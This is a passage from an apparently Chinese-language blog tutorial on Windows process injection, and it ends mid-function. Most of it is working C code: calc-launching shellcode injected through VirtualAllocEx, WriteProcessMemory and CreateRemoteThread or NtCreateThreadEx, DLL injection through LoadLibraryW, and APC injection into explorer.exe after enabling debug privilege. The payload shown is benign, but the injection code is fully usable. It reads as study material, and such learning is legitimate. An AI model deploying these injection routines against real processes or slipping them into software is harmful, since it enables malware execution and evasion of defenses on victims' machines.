&quot;\\x65\\x6D\\x00\\x00\\x68\\x73\\x79\\x73\\x74\\x54\\x57\\xFF\\x55&quot;\n        &quot;\\x4C\\x89\\x45\\x5C\\x6A\\x00\\x68\\x63\\x61\\x6C\\x63\\x54\\xFF&quot;\n        &quot;\\x55\\x5C\\xFF\\x55\\x54\\xC3\\xCC&quot;;\n\n    // 获取大小\n    int size = sizeof(shellcode);\n\n    // 获取A.exe的PID\n    DWORD dwProcessId = GetPid(&quot;A.exe&quot;);\n\n    // 1.打开进程\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);\n\n    if (hProcess)\n    &#123;\n        // 2.开辟内存空间 VirtualAllocEx 指定进程开辟内存\n        LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n        if (lpAddress)\n        &#123;\n            printf(&quot;address:%p\\n&quot;, lpAddress);\n\n            // 3.写入shellcode\n            BOOL bRet = WriteProcessMemory(hProcess, lpAddress, shellcode, size, NULL);\n            if (bRet)\n            &#123;\n                printf(&quot;success write shellcode\\n&quot;);\n            &#125;\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<p>　　再次查看内存空间，成功将shellcode写入</p>\n<p>​        执行shellcode，要用到创建远程线程:，它能够创建一个在其它进程地址空间中运行的线程</p>\n<p>　　可看到只比CreateThread多一个进程句柄参数</p>\n<pre><code class=\"c\">HANDLE CreateRemoteThread(\n    HANDLE                 hProcess,\t\t\t// 进程句柄\n    LPSECURITY_ATTRIBUTES  lpThreadAttributes,\t// 安全属性 通常为NULL表示使用默认设置\n    SIZE_T                 dwStackSize,\t\t\t// 线程栈空间大小 传入0表示使用默认大小(1MB)\n    LPTHREAD_START_ROUTINE lpStartAddress,\t\t// 表示新线程所执行的线程函数地址\n    LPVOID                 lpParameter,\t\t\t// 线程函数的参数\n    DWORD                  dwCreationFlags,\t\t// 控制线程的创建 0 创建完毕立即调度 CREATE_SUSPENDED 创建后挂起\n    LPDWORD                lpThreadId\t\t\t// 返回线程的ID号 NULL表示不需要返回该线程ID号\n);\t\t\t\t\t\t\t\t\t\t\t\t// 返回值:线程句柄 创建失败返回NULL\n</code></pre>\n<p>　　下面代码会引发一个问题，虽然成功弹出了计算器，但A.exe进程也退出了。尚未解决。</p>\n<pre><code class=\"c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;TlHelp32.h&gt;\n\n// 获取PID\nDWORD GetPid(char *name)\n&#123;\n    // 创建进程快照\n    HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\n    // 句柄无效\n    if (hProcess == INVALID_HANDLE_VALUE)\n    &#123;\n        return -1;\n    &#125;\n\n    // 快照信息结构体\n    PROCESSENTRY32 pe;\n    ZeroMemory(&amp;pe, sizeof(pe));\n    pe.dwSize = sizeof(pe);\n\n    BOOL flag = Process32First(hProcess, &amp;pe);\n    while (flag)\n    &#123;\n        // 已成功找到进程\n        if (strcmp(pe.szExeFile, name) == 0)\n        &#123;\n            // 返回对应PID\n            return pe.th32ProcessID;\n        &#125;\n        flag = Process32Next(hProcess, &amp;pe);\n    &#125;\n\n    CloseHandle(hProcess);\n\n    return -1;\n&#125;\n\nint main()\n&#123;\n    // 执行计算器的shellcode\n    unsigned char shellcode[] =\n        &quot;\\x55\\x64\\x8B\\x35\\x30\\x00\\x00\\x00\\x8B\\x76\\x0C\\x8B\\x76&quot;\n        &quot;\\x1C\\x8B\\x6E\\x08\\x8B\\x7E\\x20\\x8B\\x36\\x38\\x4F\\x18\\x75&quot;\n        &quot;\\xF3\\x8B\\xFD\\x83\\xEC\\x64\\x8B\\xEC\\x8B\\x47\\x3C\\x8B\\x54&quot;\n        &quot;\\x07\\x78\\x03\\xD7\\x8B\\x4A\\x18\\x8B\\x5A\\x20\\x03\\xDF\\x49&quot;\n        &quot;\\x8B\\x34\\x8B\\x03\\xF7\\xB8\\x47\\x65\\x74\\x50\\x39\\x06\\x75&quot;\n        &quot;\\xF1\\xB8\\x72\\x6F\\x63\\x41\\x39\\x46\\x04\\x75\\xE7\\x8B\\x5A&quot;\n        &quot;\\x24\\x03\\xDF\\x66\\x8B\\x0C\\x4B\\x8B\\x5A\\x1C\\x03\\xDF\\x8B&quot;\n        &quot;\\x04\\x8B\\x03\\xC7\\x89\\x45\\x4C\\x6A\\x00\\x68\\x61\\x72\\x79&quot;\n        &quot;\\x41\\x68\\x4C\\x69\\x62\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x57&quot;\n        &quot;\\xFF\\x55\\x4C\\x89\\x45\\x50\\x6A\\x00\\x68\\x65\\x73\\x73\\x00&quot;\n        &quot;\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69\\x74\\x54\\x57\\xFF&quot;\n        &quot;\\x55\\x4C\\x89\\x45\\x54\\x6A\\x00\\x68\\x72\\x74\\x00\\x00\\x68&quot;\n        &quot;\\x6D\\x73\\x76\\x63\\x54\\xFF\\x55\\x50\\x8B\\xF8\\x6A\\x00\\x68&quot;\n        &quot;\\x65\\x6D\\x00\\x00\\x68\\x73\\x79\\x73\\x74\\x54\\x57\\xFF\\x55&quot;\n        &quot;\\x4C\\x89\\x45\\x5C\\x6A\\x00\\x68\\x63\\x61\\x6C\\x63\\x54\\xFF&quot;\n        &quot;\\x55\\x5C\\xFF\\x55\\x54\\xC3\\xCC&quot;;\n\n    // 获取大小\n    int size = sizeof(shellcode);\n\n    // 获取A.exe的PID\n    DWORD dwProcessId = GetPid(&quot;A.exe&quot;);\n\n    // 1.打开进程\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);\n\n    if (hProcess)\n    &#123;\n        // 2.开辟内存空间 VirtualAllocEx 指定进程开辟内存\n        LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n        if (lpAddress)\n        &#123;\n            printf(&quot;address:%p\\n&quot;, lpAddress);\n\n            // 3.写入shellcode\n            BOOL bRet = WriteProcessMemory(hProcess, lpAddress, shellcode, size, NULL);\n            if (bRet)\n            &#123;\n                printf(&quot;success write shellcode\\n&quot;);\n\n                // 4.执行shellcode\n                HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpAddress, NULL, 0, NULL);\n                if (hThread)\n                &#123;\n                    printf(&quot;exec shellcode\\n&quot;);\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<h5 id=\"NtCreateThreadEx\"><a href=\"#NtCreateThreadEx\" class=\"headerlink\" title=\"NtCreateThreadEx\"></a>NtCreateThreadEx</h5><p>　　先说说什么是Native API。为了方便与操作系统进行交互，程序员一般使用微软推荐的标准API（Win 32 API）。标准Windows APIs是在Native  APIs的基础上包装产生的。Native APIs 或 Undocumented APIs 都可以在 ntdll.dll  库中找到。微软不推荐使用这些API。native  API也使用syscalls与os内核交互，微软使用这种架构是因为它可以在不影响标准API的情况下改变操作系统内核。</p>\n<p>　　Native API也被称为无文档API，因为你通常找不到它们的官方文档。我们主要是通过查看其他人的代码或者别人总结的非官方文档，来查看它们的使用方法。</p>\n<p>　　这次，尝试使用原生API。首先，需要将ntdll.dll加载到进程中。然后需要自定义与原始函数格式完全相同的函数指针，并使用这些函数的基地址来初始化这些指针.</p>\n<p>　　可以使用GetModuleHandle函数，动态加载ntdll.dll或任何其他dll到进程中，它会返回该库的一个句柄。</p>\n<pre><code class=\"c\">HMODULE hmodule = GetModuleHandle(L&quot;ntdll.dll&quot;);\n</code></pre>\n<p>　　然后定义函数指针类型，并使用GetProcAddress函数获取函数的基地址，并将其赋值给指针，以下是NtCreateThreadEx的使用例子。</p>\n<pre><code class=\"c\">// 定义NtCreateThreadEx函数指针\ntypedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)\n(\n    OUT PHANDLE hThread,\n    IN ACCESS_MASK DesiredAccess,\n    IN PVOID ObjectAttributes,\n    IN HANDLE ProcessHandle,\n    IN PVOID lpStartAddress,\n    IN PVOID lpParameter,\n    IN ULONG Flags,\n    IN SIZE_T StackZeroBits,\n    IN SIZE_T SizeOfStackCommit,\n    IN SIZE_T SizeOfStackReserve,\n    OUT PVOID lpBytesBuffer\n);\n\n// 加载ntdll.dll\nHMODULE hmodule = GetModuleHandle(L&quot;ntdll.dll&quot;);\n// 获取NtCreateThreadEx地址\npfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(hmodule, &quot;NtCreateThreadEx&quot;);\n// 使用NtCreateThreadEx\nHANDLE hThread = NULL;\nNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);\n</code></pre>\n<p>　　你不需要理解NtCreateThreadEx各个参数具体什么意思，因为没有官方api，所以直接看别人的代码来使用就行。　　下面代码Visual Studio编译通过</p>\n<pre><code class=\"c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;TlHelp32.h&gt;\n#include &lt;comdef.h&gt;\n\n// 定义NtCreateThreadEx函数指针\ntypedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)\n(\n    OUT PHANDLE hThread,\n    IN ACCESS_MASK DesiredAccess,\n    IN PVOID ObjectAttributes,\n    IN HANDLE ProcessHandle,\n    IN PVOID lpStartAddress,\n    IN PVOID lpParameter,\n    IN ULONG Flags,\n    IN SIZE_T StackZeroBits,\n    IN SIZE_T SizeOfStackCommit,\n    IN SIZE_T SizeOfStackReserve,\n    OUT PVOID lpBytesBuffer\n);\n\n// 获取PID\nDWORD GetPid(char name[])\n&#123;\n    // 创建进程快照\n    HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\n    // 句柄无效\n    if (hProcess == INVALID_HANDLE_VALUE)\n    &#123;\n        return -1;\n    &#125;\n\n    // 快照信息结构体\n    PROCESSENTRY32 pe;\n    ZeroMemory(&amp;pe, sizeof(pe));\n    pe.dwSize = sizeof(pe);\n\n    BOOL flag = Process32First(hProcess, &amp;pe);\n    while (flag)\n    &#123;\n        // 已成功找到进程\n        if (strcmp( _bstr_t(pe.szExeFile), name) == 0)\n        &#123;\n            // 返回对应PID\n            return pe.th32ProcessID;\n        &#125;\n        flag = Process32Next(hProcess, &amp;pe);\n    &#125;\n\n    CloseHandle(hProcess);\n\n    return -1;\n&#125;\n\nint main()\n&#123;\n    // 执行计算器的shellcode\n    unsigned char shellcode[] =\n        &quot;\\x55\\x64\\x8B\\x35\\x30\\x00\\x00\\x00\\x8B\\x76\\x0C\\x8B\\x76&quot;\n        &quot;\\x1C\\x8B\\x6E\\x08\\x8B\\x7E\\x20\\x8B\\x36\\x38\\x4F\\x18\\x75&quot;\n        &quot;\\xF3\\x8B\\xFD\\x83\\xEC\\x64\\x8B\\xEC\\x8B\\x47\\x3C\\x8B\\x54&quot;\n        &quot;\\x07\\x78\\x03\\xD7\\x8B\\x4A\\x18\\x8B\\x5A\\x20\\x03\\xDF\\x49&quot;\n        &quot;\\x8B\\x34\\x8B\\x03\\xF7\\xB8\\x47\\x65\\x74\\x50\\x39\\x06\\x75&quot;\n        &quot;\\xF1\\xB8\\x72\\x6F\\x63\\x41\\x39\\x46\\x04\\x75\\xE7\\x8B\\x5A&quot;\n        &quot;\\x24\\x03\\xDF\\x66\\x8B\\x0C\\x4B\\x8B\\x5A\\x1C\\x03\\xDF\\x8B&quot;\n        &quot;\\x04\\x8B\\x03\\xC7\\x89\\x45\\x4C\\x6A\\x00\\x68\\x61\\x72\\x79&quot;\n        &quot;\\x41\\x68\\x4C\\x69\\x62\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x57&quot;\n        &quot;\\xFF\\x55\\x4C\\x89\\x45\\x50\\x6A\\x00\\x68\\x65\\x73\\x73\\x00&quot;\n        &quot;\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69\\x74\\x54\\x57\\xFF&quot;\n        &quot;\\x55\\x4C\\x89\\x45\\x54\\x6A\\x00\\x68\\x72\\x74\\x00\\x00\\x68&quot;\n        &quot;\\x6D\\x73\\x76\\x63\\x54\\xFF\\x55\\x50\\x8B\\xF8\\x6A\\x00\\x68&quot;\n        &quot;\\x65\\x6D\\x00\\x00\\x68\\x73\\x79\\x73\\x74\\x54\\x57\\xFF\\x55&quot;\n        &quot;\\x4C\\x89\\x45\\x5C\\x6A\\x00\\x68\\x63\\x61\\x6C\\x63\\x54\\xFF&quot;\n        &quot;\\x55\\x5C\\xFF\\x55\\x54\\xC3\\xCC&quot;;\n\n    // 获取大小\n    int size = sizeof(shellcode);\n\n    char name[] = &quot;A.exe&quot;;\n    // 获取A.exe的PID\n    DWORD dwProcessId = GetPid(name);\n    \n    // 1.打开进程\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);\n\n    if (hProcess)\n    &#123;\n        // 2.开辟内存空间 VirtualAllocEx 指定进程开辟内存\n        LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n        if (lpAddress)\n        &#123;\n            printf(&quot;address:%p\\n&quot;, lpAddress);\n\n            // 3.写入shellcode\n            BOOL bRet = WriteProcessMemory(hProcess, lpAddress, shellcode, size, NULL);\n            if (bRet)\n            &#123;\n                // 加载ntdll.dll\n                HMODULE hmodule = GetModuleHandle(L&quot;ntdll.dll&quot;);\n                if (!hmodule) return 0;\n\n                // 获取NtCreateThreadEx地址\n                pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(hmodule, &quot;NtCreateThreadEx&quot;);\n                if (!NtCreateThreadEx) return 0;\n\n                // 4.执行shellcode\n                HANDLE hThread = NULL;\n                NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);\n                if (!hThread) return 0;\n\n                printf(&quot;success write shellcode\\n&quot;);\n\n                WaitForSingleObject(hThread, INFINITE);\n            &#125;\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<h4 id=\"dll注入\"><a href=\"#dll注入\" class=\"headerlink\" title=\"dll注入\"></a>dll注入</h4><p>　　 dll注入即是让程序A强行加载程序B给定的a.dll，并执行程序B给定的a.dll里面的代码。dll注入也有非常多的方法，下图说明了几乎每一种DLL注入的流程。<br>　　<a href=\"https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220228180448.jpg\"><img src=\"https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220228180448.jpg\" alt=\"img\"></a><br>　　这里使用CreateRemoteThread进行dll注入。<br>　　先介绍一个函数<strong>LoadLibrary</strong>，将指定的模块加载到调用进程的地址空间中</p>\n<pre><code class=\"c\">HMODULE LoadLibraryA(\n    LPCSTR lpLibFileName\t// 模块名称 可以是dll文件或exe文件\n);\n</code></pre>\n<p>　　注入思路就是先获取到<strong>LoadLibrary</strong>的函数地址，之后使用CreateRemoteThread加载这段地址即可<br>　　简单的dll示例，dlltest.c</p>\n<pre><code class=\"c\">#include &quot;dlltest.h&quot;\n#include &lt;Windows.h&gt;\n\nint myAdd(int a, int b)\n&#123;\n    return a+b;\n&#125;\n\nBOOL APIENTRY DllMain(HANDLE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved\n)\n&#123;\n    switch (ul_reason_for_call)\n    &#123;\n    case DLL_PROCESS_ATTACH:\n        MessageBox(0, TEXT(&quot;注入成功&quot;), 0, 0);\n        break;\n    case DLL_PROCESS_DETACH:\n        MessageBox(0, TEXT(&quot;注入结束&quot;), 0, 0);\n        break;\n    &#125;\n    return TRUE;\n&#125;\n</code></pre>\n<p>　　dlltest.h</p>\n<pre><code class=\"c\">#ifndef PCH_H\n#define PCH_H\n\n// 添加要在此处预编译的标头\n\nextern &quot;C&quot; _declspec(dllexport) int myAdd(int a, int b);\n\n#endif //PCH_H\n</code></pre>\n<p>　　注入代码</p>\n<pre><code class=\"c\">#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main(int argc, char* argv[]) &#123;\n    HANDLE processHandle;\n    PVOID remoteBuffer;\n    BOOL bRet;\n    // dll路径\n    wchar_t dllPath[] = TEXT(&quot;D:\\\\dlltest.dll&quot;);\n\n    DWORD pid = 17020;\n    // 打开进程\n    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n    if (!processHandle) return 0;\n\n    // 分配空间\n    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (!remoteBuffer) return 0;\n\n    // dll文件路径的数据复制到目标进程中\n    bRet = WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof(dllPath), NULL);\n    if (!bRet) return 0;\n\n    //获得kernel32.dll的模块句柄\n    HMODULE hMod = GetModuleHandle(L&quot;kernel32.dll&quot;);\n    if (!hMod) return 0;\n\n    // 获得LoadLibraryW函数的起始地址\n    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;);\n    if (!threatStartRoutineAddress) return 0;\n\n    // 执行dll文件\n    HANDLE hThread = CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);\n    if (!hThread) return 0;\n\n    CloseHandle(processHandle);\n    return 0;\n&#125;\n</code></pre>\n<p>　　成功注入dll</p>\n<h4 id=\"APC注入\"><a href=\"#APC注入\" class=\"headerlink\" title=\"APC注入\"></a>APC注入</h4><p>　　APC(Asynchronous Procedure  Calls，异步过程调用),APC是函数在特定的线程被异步执行。在Windows中APC是一种并发机制，用于异步的IO或定时器。当处于用户模式的APC压入线程APC队列后，该线程并不直接调用APC函数,除非该线程处于可通知状态，调用的顺序为先入先出。</p>\n<p>　　只有当一个线程内部调用<strong>SleepEx</strong>、<strong>SignalObjectAdndWait</strong>、<strong>WaitForSingleObjectEx</strong>、<strong>WaitForMultioleObjectsEx</strong> 等特定函数将自己处于挂起状态时，才会执行APC队列函数，在整个执行过程中，线程并无任何异常举动，不容易被察觉，但缺点是对于单线程程序一般不存在挂起状态。</p>\n<p>　　每一个线程都有自己的APC队列（APC queue），可以使用API<strong>QueueUserAPC</strong>从而将一个APC插入到线程的APC队列中。线程会调用<strong>QueueUserAPC</strong>中指定的函数。只有将一个APC放入了线程的APC队列中，线程才有机会调用对应的APC函数。</p>\n<p>　　APC(Asynchronous Procedure Calls，异步过程调用)，表示在指定线程上下文中异步调用一个函数(APC其实是通过向线程中插入回调函数来实现的，当线程调用上述API时，会触发APC的回调函数，执行回调函数的代码)。</p>\n<p>　　apc调用例子</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nVOID ApcTest() \n&#123;\n    printf(&quot;ApcTest1\\n&quot;);\n&#125;\n\nVOID ApcTest2() \n&#123;\n    printf(&quot;ApcTest2\\n&quot;);\n&#125;\n\nint main()\n&#123;\n    HANDLE hThread = GetCurrentThread();\n    FARPROC NtQueueApcThread = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, ULONG)) GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;NtQueueApcThread&quot;);\n    // 将当前线程加入apc队列\n    NtQueueApcThread(hThread, &amp;ApcTest, 0, 0, 0);\n    printf(&quot;Add pac1\\n&quot;);\n    NtQueueApcThread(hThread, &amp;ApcTest2, 0, 0, 0);\n    printf(&quot;Add pac2\\n&quot;);\n    // 执行apc函数\n    SleepEx(3, TRUE);\n    printf(&quot;check the apc\\n&quot;);\n&#125;\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"none\">Add pac1\nAdd pac2\nApcTest1\nApcTest2\ncheck the apc\n</code></pre>\n<p>　　如果将改为，运行结果如下</p>\n<pre><code class=\"none\">Add pac1\nAdd pac2\ncheck the apc\n</code></pre>\n<p>　　继续用上面的例子，这次调换下位置</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nVOID ApcTest() \n&#123;\n    printf(&quot;ApcTest1\\n&quot;);\n&#125;\n\nVOID ApcTest2() \n&#123;\n    printf(&quot;ApcTest2\\n&quot;);\n&#125;\n\nint main()\n&#123;\n    HANDLE hThread = GetCurrentThread();\n    FARPROC NtQueueApcThread = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, ULONG)) GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;NtQueueApcThread&quot;);\n    // 将当前线程加入apc队列\n    NtQueueApcThread(hThread, &amp;ApcTest, 0, 0, 0);\n    printf(&quot;Add pac1\\n&quot;);\n    // 执行apc函数\n    SleepEx(3, TRUE);\n    NtQueueApcThread(hThread, &amp;ApcTest2, 0, 0, 0);\n    printf(&quot;Add pac2\\n&quot;);\n    printf(&quot;check the apc\\n&quot;);\n&#125;\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"c\">Add pac1\nApcTest1\nAdd pac2\ncheck the apc\n</code></pre>\n<p>　　从上面的例子，可以清楚的知道什么是apc了。我的理解是apc就是一个线程队列，将一个线程加入进apc后。当触发了apc，会先执行apc函数。再次强调这部分是我的理解，很有可能有误。执行流程应该如下所示</p>\n<pre><code class=\"none\">apc队列(线程1,线程2)   \n触发apc函数后，执行线程1的函数\n线程1出队\napc队列(线程2)\n触发apc函数后，执行线程2的函数\n线程2出队\napc队列()\n执行完毕\n</code></pre>\n<p>　　当前进程执行apc注入</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    unsigned char buf[] = &quot;&quot;;\n    LPVOID shellAddress = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    memcpy(shellAddress, buf,sizeof(buf));\n    QueueUserAPC((PAPCFUNC)shellAddress, GetCurrentThread(), NULL);\n    SleepEx(3000, TRUE);\n    return 0;\n&#125;\n</code></pre>\n<p>　　远程进程apc注入的流程，这里注入进explorer.exe　　1.获取目标进程的PID，并向目标进程写入shellcode。</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;TlHelp32.h&gt;\n#include &lt;comdef.h&gt;\n\n// 获取PID\nDWORD GetPid(char name[],int * cntThreads)\n&#123;\n    // 创建进程快照\n    HANDLE hSnapshotProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\n    // 句柄无效\n    if (!hSnapshotProcess) return -1;\n\n    // 快照信息结构体\n    PROCESSENTRY32 pe;\n    ZeroMemory(&amp;pe, sizeof(pe));\n    pe.dwSize = sizeof(pe);\n\n    BOOL flag = Process32First(hSnapshotProcess, &amp;pe);\n    while (flag)\n    &#123;\n        // 已成功找到进程\n        if (strcmp(_bstr_t(pe.szExeFile), name) == 0)\n        &#123;\n            // 获取线程数\n            *cntThreads = pe.cntThreads;\n            // 返回对应PID\n            CloseHandle(hSnapshotProcess);\n            return pe.th32ProcessID;\n        &#125;\n        flag = Process32Next(hSnapshotProcess, &amp;pe);\n    &#125;\n\n    CloseHandle(hSnapshotProcess);\n\n    return -1;\n&#125;\n\n// 启用调试权限\nBOOL EnableDebugAbility()\n&#123;\n    // 令牌句柄\n    HANDLE hProcessToken = NULL;\n    // 1.打开进程访问令牌\n    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hProcessToken))\n    &#123;\n        printf(&quot;error open process token\\n&quot;);\n        return FALSE;\n    &#125;\n\n    // 2.取得SeDebugPrivilege特权的LUID值\n    LUID luid;\n    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid))\n    &#123;\n        printf(&quot;error lookup value\\n&quot;);\n        return FALSE;\n    &#125;\n\n    // 3.调整访问令牌特权\n    TOKEN_PRIVILEGES token;\n    token.PrivilegeCount = 1;\n    token.Privileges[0].Luid = luid;\n    // 使特权有效\n    token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n    if (!AdjustTokenPrivileges(hProcessToken, FALSE, &amp;token, 0, NULL, NULL))\n    &#123;\n        printf(&quot;error adjust token\\n&quot;);\n        return FALSE;\n    &#125;\n\n    CloseHandle(hProcessToken);\n    return TRUE;\n\n&#125;\n\nint main()\n&#123;\n\n    // 获取调试权限\n    BOOL bRet = EnableDebugAbility();\n    if (!bRet) return 0;\n\n    unsigned char shellcode[] = &quot;&quot;;\n\n    char processName[] = &quot;explorer.exe&quot;;\n    // 目标进程线程数\n    int cntThreads = 0;\n    // 目标进程pid\n    DWORD pid = GetPid(processName,&amp;cntThreads);\n    if (pid == -1 || cntThreads &lt;= 0) return 0;\n\n    // 打开目标进程\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n    if (!hProcess) return 0;\n    // 分配空间\n    LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (!lpAddress) return 0;\n    // 写入shellcode\n    bRet = WriteProcessMemory(hProcess, lpAddress, shellcode, sizeof(shellcode), NULL);\n    if (!bRet) return 0;\n\n&#125;\n</code></pre>\n<p>　　为了注入成功，我们应该尽可能的让所有线程都执行apc函数</p>\n<p>　　2.获取目标进程中的所有线程并保存进数组中，这里要用到线程结构体<strong>THREADENTRY32</strong></p>\n<pre><code class=\"c\">typedef struct tagTHREADENTRY32\n&#123;\n    DWORD   dwSize;\t\t\t\t\t// 结构体的大小 必须初始化为sizeof(THREADENTRY32)\n    DWORD   cntUsage;\t\t\t\t// 不用 总是设置为0\n    DWORD   th32ThreadID;       \t// 线程ID\n    DWORD   th32OwnerProcessID;\t\t// 所属进程ID\n    LONG    tpBasePri;\t\t\t\t// 线程的初始优先级\n    LONG    tpDeltaPri;\t\t\t\t// 不用 总是设置为0\n    DWORD   dwFlags;\t\t\t\t// 不用 总是设置为0\n&#125; THREADENTRY32,*PTHREADENTRY32;;\n</code></pre>\n<p>　　创建线程快照，就是将<code>CreateToolhelp32Snapshot</code>中的<code>dwFlags</code>设置<code>为TH32CS_SNAPTHREAD</code></p>\n<pre><code class=\"c\">// 获取线程快照\nHANDLE hSnapshotThread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)\n</code></pre>\n<p>　　遍历线程要用到两个函数，</p>\n<p><strong>QueueUserAPC</strong></p>\n<pre><code class=\"c\">DWORD QueueUserAPC(\n    PAPCFUNC  pfnAPC,\t// APC函数指针\n    HANDLE    hThread,\t// 线程句柄，此句柄必须有THREAD_SET_CONTEXT权限\n    ULONG_PTR dwData\t// 传到pfnAPC参数指向的APC函数的值\n);\t\t\t\t\t\t// 成功返回非0\n</code></pre>\n<p>　　示例</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;TlHelp32.h&gt;\n#include &lt;comdef.h&gt;\n\n// 获取PID\nDWORD GetPid(char name[],int * cntThreads)\n&#123;\n    // 创建进程快照\n    HANDLE hSnapshotProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\n    // 句柄无效\n    if (!hSnapshotProcess) return -1;\n\n    // 快照信息结构体\n    PROCESSENTRY32 pe;\n    ZeroMemory(&amp;pe, sizeof(pe));\n    pe.dwSize = sizeof(pe);\n\n    BOOL flag = Process32First(hSnapshotProcess, &amp;pe);\n    while (flag)\n    &#123;\n        // 已成功找到进程\n        if (strcmp(_bstr_t(pe.szExeFile), name) == 0)\n        &#123;\n            // 获取线程数\n            *cntThreads = pe.cntThreads;\n            // 返回对应PID\n            CloseHandle(hSnapshotProcess);\n            return pe.th32ProcessID;\n        &#125;\n        flag = Process32Next(hSnapshotProcess, &amp;pe);\n    &#125;\n\n    CloseHandle(hSnapshotProcess);\n\n    return -1;\n&#125;\n\n// 启用调试权限\nBOOL EnableDebugAbility()\n&#123;\n    // 令牌句柄\n    HANDLE hProcessToken = NULL;\n    // 1.打开进程访问令牌\n    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hProcessToken))\n    &#123;\n        printf(&quot;error open process token\\n&quot;);\n        return FALSE;\n    &#125;\n\n    // 2.取得SeDebugPrivilege特权的LUID值\n    LUID luid;\n    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid))\n    &#123;\n        printf(&quot;error lookup value\\n&quot;);\n        return FALSE;\n    &#125;\n\n    // 3.调整访问令牌特权\n    TOKEN_PRIVILEGES token;\n    token.PrivilegeCount = 1;\n    token.Privileges[0].Luid = luid;\n    // 使特权有效\n    token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n    if (!AdjustTokenPrivileges(hProcessToken, FALSE, &amp;token, 0, NULL, NULL))\n    &#123;\n        printf(&quot;error adjust token\\n&quot;);\n        return FALSE;\n    &#125;\n\n    CloseHandle(hProcessToken);\n    return TRUE;\n\n&#125;\n\n// 执行代码\nBOOL RunCode(LPVOID lpAddress,DWORD pid)\n&#123;\n    // 创建线程快照\n    HANDLE hSnapshotThread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n    // 句柄无效\n    if (!hSnapshotThread) return FALSE;\n\n    // 